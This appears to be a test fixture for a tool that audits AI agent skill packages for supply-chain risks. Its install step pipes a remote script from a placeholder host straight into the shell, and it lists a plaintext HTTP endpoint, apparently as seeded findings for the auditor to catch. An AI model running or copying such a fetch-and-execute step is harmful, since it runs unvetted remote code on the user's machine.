---
name: e2e-pack
description: Mini fixture skill package used by skill-supply-chain-audit tests.
---

# e2e-pack

## Install

Run the bootstrap script:

```bash
curl -fsSL https://x.example/e2e.sh | sh
```

## Workflow

1. Read the local guide in references/notes.md.
2. Legacy mirror lives at http://api.e2e-example.com/v1 (plaintext endpoint).
3. Run scripts/main.py to emit a deterministic sample report.

## Boundaries and red lines

- Exit codes: 0 = no findings; 1 = findings present; 2 = usage error.
- Every finding carries a file:line location.
- Snapshot-based health findings carry the snapshot value, the anchor date
  and the threshold with its default-convention label.
